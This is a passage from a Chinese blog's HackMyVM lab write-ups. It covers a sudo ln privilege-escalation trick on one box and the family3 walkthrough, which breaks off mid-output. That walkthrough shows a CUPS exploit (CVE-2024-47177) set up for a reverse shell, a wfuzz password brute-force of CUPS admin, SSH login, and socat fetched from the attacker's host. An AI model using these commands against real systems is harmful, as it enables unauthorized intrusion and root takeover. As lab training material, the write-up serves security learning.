<p>拿到rootshell  解决</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln -fd /bin/bash /bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln</span><br><span class="line">root<span class="variable">@helium</span><span class="symbol">:/home/paul</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<h2 id="提权命令解释"><a href="#提权命令解释" class="headerlink" title="提权命令解释"></a>提权命令解释</h2><p>📌 ln 命令解释<br>ln 是 Linux 系统中的 创建链接命令，用于创建 硬链接 或 符号链接（软链接）。</p>
<p>🔍 ln 命令的基本用法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> [选项] 目标文件 目标链接</span><br></pre></td></tr></table></figure></div>
<p>硬链接（默认）：不使用 -s，创建一个指向同一 inode 的文件。<br>符号链接（软链接）：使用 -s，创建一个指向目标文件路径的快捷方式。</p>
<h3 id="sudo-ln-fs-bin-sh-bin-ln-解析"><a href="#sudo-ln-fs-bin-sh-bin-ln-解析" class="headerlink" title="sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln 解析"></a>sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln 解析</h3><p>这条命令的作用是 用 &#x2F;bin&#x2F;sh 替换 &#x2F;bin&#x2F;ln，并且强制创建符号链接。</p>
<h4 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h4><p>ln 命令用于 创建硬链接或符号链接，在这里用于 替换系统的 ln 命令。</p>
<h4 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h4><p>-f 选项 强制覆盖 目标文件（如果 &#x2F;bin&#x2F;ln 已经存在，它会被替换）。</p>
<h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>-s 选项 创建符号链接（软链接，而不是硬链接）。</p>
<h4 id="bin-sh"><a href="#bin-sh" class="headerlink" title="&#x2F;bin&#x2F;sh"></a>&#x2F;bin&#x2F;sh</h4><p>&#x2F;bin&#x2F;sh 是目标文件，ln 命令会创建一个指向 &#x2F;bin&#x2F;sh 的符号链接。</p>
<h4 id="bin-ln"><a href="#bin-ln" class="headerlink" title="&#x2F;bin&#x2F;ln"></a>&#x2F;bin&#x2F;ln</h4><p>&#x2F;bin&#x2F;ln 是目标路径，执行后 &#x2F;bin&#x2F;ln 变成了 &#x2F;bin&#x2F;sh 的别名。</p>
<p>由于 &#x2F;bin&#x2F;ln 现在指向 &#x2F;bin&#x2F;sh，所以 sudo ln 实际上等于 sudo &#x2F;bin&#x2F;sh。</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family3</title>
    <url>/posts/6117.html</url>
    <content><![CDATA[<p>HMV-family3靶场复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap 192.168.58.62    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">07</span> <span class="number">17</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.62</span>)</span><br><span class="line">Host is up (<span class="number">0.0069</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>  open  ssh</span><br><span class="line"><span class="number">631</span><span class="symbol">/tcp</span> open  ipp</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">6.17</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>这里出现了一个我之前没怎么见过的端口631 ， 搜了一下ipp是个什么服务：<br>互联网打印协议 (IPP)，如RFC2910和RFC2911中所规定，是互联网打印的基础。其可扩展性通过IPP Everywhere等发展得以展示，旨在标准化移动和云打印，并引入3D 打印的扩展。利用HTTP协议，IPP 受益于已建立的安全实践，包括基本&#x2F;摘要认证和SSL&#x2F;TLS 加密。提交打印作业或查询打印机状态等操作通过指向 IPP 服务器的HTTP POST 请求进行，该服务器在port 631&#x2F;tcp上运行。<br>IPP 的一个著名实现是CUPS，这是一个在各种 Linux 发行版和 OS X 中普遍使用的开源打印系统。尽管其有用，IPP 与 LPD 类似，可能被利用通过PostScript或PJL 文件传输恶意内容，突显出潜在的安全风险。</p>
<p>就是一个有漏洞的打印服务<br>因为这是一个基于http的服务所以还是可以去访问一下网页</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p><img src="https://pic1.imgdb.cn/item/67cab7dc066befcec6e04da4.png"><br>这个是一个 IPP 服务器 搜了一下cups的漏洞之后发现漏洞编号是CVE-2024-47177 然后在github找到利用的脚本<a href="https://github.com/vulhub/evil-ipp-server">https://github.com/vulhub/evil-ipp-server</a><br>然后编辑一下脚本中的command，这里我选择反弹shell<br><img src="https://pic1.imgdb.cn/item/67cabc2f066befcec6e05216.png"><br>然后安装ippserver库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# pip3 install ippserver --<span class="keyword">break</span>-system-packages</span><br><span class="line">Requirement already satisfied: ippserver in <span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">12</span>/dist-packages (<span class="number">0.2</span>)</span><br><span class="line">Requirement already satisfied: requests in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> ippserver) (<span class="number">2.32</span>.<span class="number">3</span>)</span><br><span class="line">Requirement already satisfied: certifi&gt;=<span class="number">2017.4</span>.<span class="number">17</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">2024.12</span>.<span class="number">14</span>)</span><br><span class="line">Requirement already satisfied: charset-normalizer&lt;<span class="number">4</span>,&gt;=<span class="number">2</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">3.4</span>.<span class="number">0</span>)</span><br><span class="line">Requirement already satisfied: idna&lt;<span class="number">4</span>,&gt;=<span class="number">2.5</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">3.8</span>)</span><br><span class="line">Requirement already satisfied: urllib3&lt;<span class="number">3</span>,&gt;=<span class="number">1.21</span>.<span class="number">1</span> in <span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages (<span class="keyword">from</span> requests-&gt;ippserver) (<span class="number">2.2</span>.<span class="number">3</span>)</span><br><span class="line">WARNING: Running pip as the <span class="string">&#x27;root&#x27;</span> user can result in broken permissions and conflicting behaviour with the system <span class="keyword">package</span> manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https:<span class="comment">//pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# python3 <span class="number">41777</span>.py <span class="number">192.168</span>.<span class="number">58.11</span> <span class="number">192.168</span>.<span class="number">58.62</span></span><br></pre></td></tr></table></figure></div>
<p>执行完命令之后会发现在printer这里多了一个，就是我们的攻击ip<br><img src="https://pic1.imgdb.cn/item/67cabc9b066befcec6e05291.png"><br>但是试了半天，发现这个shell还是弹不回来，看了下wp，发现是走错路了<br>这个网站有一个admin界面，需要爆破账号密码<br><img src="https://pic1.imgdb.cn/item/67cac06e066befcec6e057a5.png"><br>这里我们已经知道了一个mum的用户名，用wfuzz爆破一下<br>这里先用了bp拦截，发现在登录界面是一个post请求，而且参数也已知</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># wfuzz -c -u http://192.168.58.62:631/admin/ --basic mum:FUZZ -w rockyou.txt -b &#x27;org.cups.sid=f78970dc2347a763ec24e09c013d76bb&#x27; -d &quot;org.cups.sid=df16eb974ff8e01177f03fafe7aa2887&amp;OP=add-printer&quot; -Z --hc 401</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.62:631/admin/</span><br><span class="line">Total requests: 14344392</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                 </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000001:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123456&quot;                                                                                </span><br><span class="line">000000003:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123456789&quot;                                                                             </span><br><span class="line">000000050:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;hannah&quot;                                                                                </span><br><span class="line">000000049:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;superman&quot;                                                                              </span><br><span class="line">000000046:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;joshua&quot;                                                                                </span><br><span class="line">000000007:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;1234567&quot;                                                                               </span><br><span class="line">000000015:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;lovely&quot;                                                                                </span><br><span class="line">000000047:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;bubbles&quot;                                                                               </span><br><span class="line">000000048:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;1234567890&quot;                                                                            </span><br><span class="line">000000031:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;friends&quot;                                                                               </span><br><span class="line">000000045:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;jennifer&quot;                                                                              </span><br><span class="line">000000038:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;loveme&quot;                                                                                </span><br><span class="line">000000041:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;football&quot;                                                                              </span><br><span class="line">000000036:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;liverpool&quot;                                                                             </span><br><span class="line">000000043:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;andrea&quot;                                                                                </span><br><span class="line">000000040:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;123123&quot;                                                                                </span><br><span class="line">000000037:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;justin&quot;                                                                                </span><br><span class="line">000000044:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;carlos&quot;                                                                                </span><br><span class="line">000000039:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;fuckyou&quot;                                                                               </span><br><span class="line">000000042:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;secret&quot;                                                                                </span><br><span class="line">000000035:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;jordan&quot;                                                                                </span><br><span class="line">000000027:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;chocolate&quot;                                                                             </span><br><span class="line">000000032:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;butterfly&quot;                                                                             </span><br><span class="line">000000025:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;tigger&quot;                                                                                </span><br><span class="line">000000033:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;purple&quot;                                                                                </span><br><span class="line">000000029:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;soccer&quot;                                                                                </span><br><span class="line">000000026:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;sunshine&quot;                                                                              </span><br><span class="line">000000034:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;angel&quot;                                                                                 </span><br><span class="line">000000028:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;password1&quot;                                                                             </span><br><span class="line">000000030:  <span class="number"> 200 </span>      <span class="number"> 100 </span>L   <span class="number"> 331 </span>W     <span class="number"> 4618 </span>Ch     &quot;anthony&quot;                                                                               </span><br><span class="line">zsh: killed     wfuzz -c -u http://192.168.58.62:631/admin/ --basic mum:FUZZ -w rockyou.txt -</span><br></pre></td></tr></table></figure></div>

<p>-c 带颜色输出 –basic 格式为“user:pass”或“FUZZ:FUZZ” -b 指定cookie -Z 扫描模式  -d使用post数据（例如：“id&#x3D;FUZZ&amp;catalog&#x3D;1”）<br>但是扫出来很多个，现在把得到的结果当作一个字典，再去用bp爆破登录一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">cat</span> tmp | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">123456</span><br><span class="line">123456789</span><br><span class="line">hannah</span><br><span class="line">superman</span><br><span class="line">joshua</span><br><span class="line">1234567</span><br><span class="line">lovely</span><br><span class="line">bubbles</span><br><span class="line">1234567890</span><br><span class="line">friends</span><br><span class="line">jennifer</span><br><span class="line">loveme</span><br><span class="line">football</span><br><span class="line">liverpool</span><br><span class="line">andrea</span><br><span class="line">123123</span><br><span class="line">justin</span><br><span class="line">carlos</span><br><span class="line">fuckyou</span><br><span class="line">secret</span><br><span class="line">jordan</span><br><span class="line">chocolate</span><br><span class="line">butterfly</span><br><span class="line">tigger</span><br><span class="line">purple</span><br><span class="line">soccer</span><br><span class="line">sunshine</span><br><span class="line">angel</span><br><span class="line">password1</span><br><span class="line">anthony</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">cat</span> tmp | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span> &gt; pass </span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67cac50f066befcec6e05ddb.png"><br>在bp看到这里传入账号密码的方式是在Basic这里，并且用了base64，格式是mum:password<br><img src="https://pic1.imgdb.cn/item/67cac592066befcec6e05e06.png"><br>把刚才的字典拿进来，然后加上一个前缀以及用base64编码 最下面的url encode也要取消，因为base64里面有&#x3D;号<br><img src="https://pic1.imgdb.cn/item/67cac658066befcec6e05e22.png"><br>成功找到密码<code>lovely</code><br>登录到mum的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh mum@<span class="number">192.168</span>.<span class="number">58.62</span>           </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.58.62 (192.168.58.62)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:vZEvCqRgxS6H8cJ6Umlp0yPH8QAidaOqPupC9t/CPr0.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.58.62&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">mum@<span class="number">192.168</span>.<span class="number">58.62</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux family <span class="number">5.10</span>.<span class="number">0</span>-<span class="number">18</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">5.10</span>.<span class="number">140</span>-<span class="number">1</span> (<span class="number">2022</span>-<span class="number">09</span>-<span class="number">02</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Oct <span class="number">23</span> <span class="number">17</span>:<span class="number">43</span>:<span class="number">43</span> <span class="number">2022</span> <span class="keyword">from</span> fe80::d63d:<span class="number">7</span>eff:fef1:<span class="number">3736%</span>enp0s3</span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-<span class="number">8</span>)</span><br><span class="line">mum@family:~$ </span><br></pre></td></tr></table></figure></div>


<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="mum"><a href="#mum" class="headerlink" title="mum"></a>mum</h2><p>mum目录下没有任何文件，没有sudo，suid也没有<br>去dad的目录下面，发现有两个文件是由执行和读权限的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">mum@family:/home/dad$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x<span class="number"> 5 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 25 </span><span class="number"> 2022 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 5 </span>root root<span class="number"> 4096 </span>Oct<span class="number"> 11 </span><span class="number"> 2022 </span>..</span><br><span class="line">lrwxrwxrwx<span class="number"> 1 </span>dad  dad    <span class="number"> 9 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad  <span class="number"> 220 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad <span class="number"> 3526 </span>Oct<span class="number"> 24 </span><span class="number"> 2022 </span>.bashrc</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 22 </span><span class="number"> 2022 </span>.local</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>dad  dad  <span class="number"> 807 </span>Oct <span class="number"> 2 </span><span class="number"> 2022 </span>.profile</span><br><span class="line">drwx------<span class="number"> 2 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 23 </span><span class="number"> 2022 </span>.ssh</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>dad  dad  <span class="number"> 620 </span>Oct<span class="number"> 25 </span><span class="number"> 2022 </span>project</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>dad  dad <span class="number"> 4096 </span>Oct<span class="number"> 23 </span><span class="number"> 2022 </span>survey</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mum@family:/home/dad$ <span class="built_in">cat</span> project </span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line">find / -user mum -writable -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name -<span class="built_in">exec</span> grep -il <span class="string">&#x27;password&#x27;</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name <span class="string">&quot;id_rsa&quot;</span> 2&gt;/dev/null</span><br><span class="line">find / -user mum -<span class="built_in">type</span> f -name <span class="string">&quot;authorized_keys&quot;</span> 2&gt;/dev/null</span><br><span class="line">find / -mmin -30 -user mum 2&gt;/dev/null | grep -v <span class="string">&quot;/proc/*&quot;</span></span><br><span class="line">find /home/dad -<span class="built_in">type</span> f ! -name <span class="string">&quot;project&quot;</span> -user dad -executable -<span class="built_in">exec</span> <span class="built_in">mv</span> <span class="string">&quot;&#123;&#125;&quot;</span> ~/survey \; </span><br><span class="line"><span class="built_in">cat</span> /var/mail/mum</span><br><span class="line"><span class="built_in">cat</span> /home/mum/.bash_history 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cups/d0002*</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ~/survey/* ; <span class="keyword">do</span> [[ -O <span class="variable">$file</span> ]] &amp;&amp; bash <span class="variable">$file</span> 2&gt;/dev/null ; <span class="keyword">done</span></span><br><span class="line">strings /dev/mem -n100 | grep -i mum</span><br><span class="line"><span class="built_in">who</span> -u |grep mum</span><br></pre></td></tr></table></figure></div>
<p>这里如果survey有文件就执行，但是现在survey有一个py文件我们看不了，看看现在的端口情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family</span><span class="symbol">:/home/dad/survey</span><span class="variable">$ </span>ss -tulnp</span><br><span class="line"><span class="title class_">Netid</span>          <span class="title class_">State</span>           <span class="title class_">Recv</span>-Q          <span class="title class_">Send</span>-Q                   <span class="title class_">Local</span> <span class="symbol">Address:</span><span class="title class_">Port</span>                    <span class="title class_">Peer</span> <span class="symbol">Address:</span><span class="title class_">Port</span>         <span class="title class_">Process</span>          </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">5353</span>                         <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">35669</span>                        <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">68</span>                           <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                              <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">631</span>                          <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                                 [::]<span class="symbol">:</span><span class="number">5353</span>                            [::]<span class="symbol">:*</span>                             </span><br><span class="line">udp            <span class="title class_">UNCONN</span>          <span class="number">0</span>               <span class="number">0</span>                                 [::]<span class="symbol">:</span><span class="number">41905</span>                           [::]<span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                            <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">22</span>                           <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                            <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">631</span>                          <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">5</span>                            <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>                         <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                               [::]<span class="symbol">:</span><span class="number">22</span>                              [::]<span class="symbol">:*</span>                             </span><br><span class="line">tcp            <span class="title class_">LISTEN</span>          <span class="number">0</span>               <span class="number">128</span>                               [::]<span class="symbol">:</span><span class="number">631</span>                             [::]<span class="symbol">:*</span>  </span><br></pre></td></tr></table></figure></div>
<p>这里发现<code>127.0.0.1:8000</code> 这里发现8000端口开着，用socat来实现端口转发</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">58.11</span>/socat</span><br><span class="line">--<span class="number">2025</span>-<span class="number">03</span>-<span class="number">07</span> <span class="number">11</span><span class="symbol">:</span><span class="number">42</span><span class="symbol">:</span><span class="number">39</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.58.11/socat</span></span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">58.11</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">375176</span> (366K) [application/octet-stream]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;socat&#x27;</span></span><br><span class="line"></span><br><span class="line">socat                                  <span class="number">100</span><span class="string">%[=========================================================================&gt;]</span> <span class="number">366</span>.38K  <span class="number">1</span>.63MB/s    <span class="keyword">in</span> <span class="number">0</span>.2s    </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">03</span>-<span class="number">07</span> <span 